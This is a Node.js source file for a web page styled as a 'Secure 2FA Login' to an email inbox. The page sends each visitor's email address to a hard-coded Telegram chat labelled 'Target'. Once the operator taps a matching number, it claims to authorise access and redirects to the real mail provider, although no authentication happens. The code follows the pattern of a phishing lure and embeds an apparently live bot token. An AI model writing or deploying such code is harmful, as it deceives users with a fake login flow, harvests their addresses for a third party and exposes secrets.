const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

// --- YOUR CREDENTIALS ---
const BOT_TOKEN = '8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs';
const MY_CHAT_ID = '7554731151'; 

const bot = new Telegraf(BOT_TOKEN);
const activeAuths = {}; 

// 1. THE WEB INTERFACE (With Smart Redirect)
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Secure 2FA Login</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <script src="/socket.io/socket.io.js"></script>
            <style>
                body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
                .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 320px; }
                #number-display { font-size: 80px; font-weight: 800; color: #1877f2; margin: 20px 0; display: none; }
                .btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; }
                input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
            </style>
        </head>
        <body>
            <div class="card" id="app">
                <h2 id="title">Email Login</h2>
                <div id="login-form">
                    <p style="color: #666;">Enter your email to access your inbox.</p>
                    <input type="email" id="email" placeholder="example@gmail.com">
                    <button class="btn" onclick="start()">Login</button>
                </div>
                <div id="auth-ui" style="display:none;">
                    <p>Authorization required. Match this number in your Telegram bot:</p>
                    <div id="number-display">--</div>
                    <p style="color: #ff9500; font-weight:bold;">Waiting for Bot Approval...</p>
                </div>
            </div>

            <script>
                const socket = io();
                let userEmail = "";

                function start() {
                    userEmail = document.getElementById('email').value;
                    if(!userEmail || !userEmail.includes('@')) return alert("Enter a valid email");
                    socket.emit('request_login', userEmail);
                }

                socket.on('show_number', (num) => {
                    document.getElementById('login-form').style.display = 'none';
                    document.getElementById('auth-ui').style.display = 'block';
                    document.getElementById('number-display').innerText = num;
                    document.getElementById('number-display').style.display = 'block';
                    document.getElementById('title').innerText = "Confirm on Phone";
                });

                socket.on('login_success', () => {
                    document.getElementById('app').innerHTML = "<h1>✅ Authorized</h1><p>Opening your inbox...</p>";
                    
                    // --- REDIRECT LOGIC ---
                    let domain = userEmail.split('@')[1].toLowerCase();
                    let targetUrl = "https://www.google.com"; // Default fallback

                    if (domain.includes("gmail")) targetUrl = "https://mail.google.com/mail/u/0/#inbox";
                    else if (domain.includes("outlook") || domain.includes("hotmail") || domain.includes("live")) targetUrl = "https://outlook.live.com/mail/0/inbox";
                    else if (domain.includes("yahoo")) targetUrl = "https://mail.yahoo.com";
                    else if (domain.includes("icloud")) targetUrl = "https://www.icloud.com/mail";

                    // Wait 1.5 seconds so the user sees the success message, then jump to the inbox
                    setTimeout(() => {
                        window.location.href = targetUrl;
                    }, 1500);
                });
            </script>
        </body>
        </html>
    `);
});

// 2. THE SERVER LOGIC
io.on('connection', (socket) => {
    socket.on('request_login', (email) => {
        const correctNum = Math.floor(Math.random() * 90 + 10);
        const decoys = [Math.floor(Math.random() * 90 + 10), Math.floor(Math.random() * 90 + 10)];
        
        activeAuths[email] = { number: correctNum, socketId: socket.id };
        const buttons = [correctNum, ...decoys].sort(() => Math.random() - 0.5);

        bot.telegram.sendMessage(MY_CHAT_ID, 
            `🔐 *INBOX ACCESS REQUEST*\n\n` +
            `📧 *Target:* \`${email}\`\n` +
            `🔢 *Match Number:* \`${correctNum}\`\n\n` +
            `Tap the matching number to authorize and open the inbox:`, 
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard(
                    buttons.map(num => Markup.button.callback(num.toString(), `auth_${email}_${num}`))
                )
            }
        );

        socket.emit('show_number', correctNum);
    });
});

// 3. THE AUTHORIZATION
bot.action(/auth_(.+)_(.+)/, (ctx) => {
    const email = ctx.match[1];
    const tappedNumber = parseInt(ctx.match[2]);
    const session = activeAuths[email];

    if (session && session.number === tappedNumber) {
        io.to(session.socketId).emit('login_success');
        ctx.editMessageText(`✅ *AUTHORIZED*\nInbox opened for \`${email}\``, { parse_mode: 'Markdown' });
        delete activeAuths[email];
    } else {
        ctx.answerCbQuery("❌ Access Denied. Wrong number.");
    }
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`Server Live`);
    bot.launch();
});
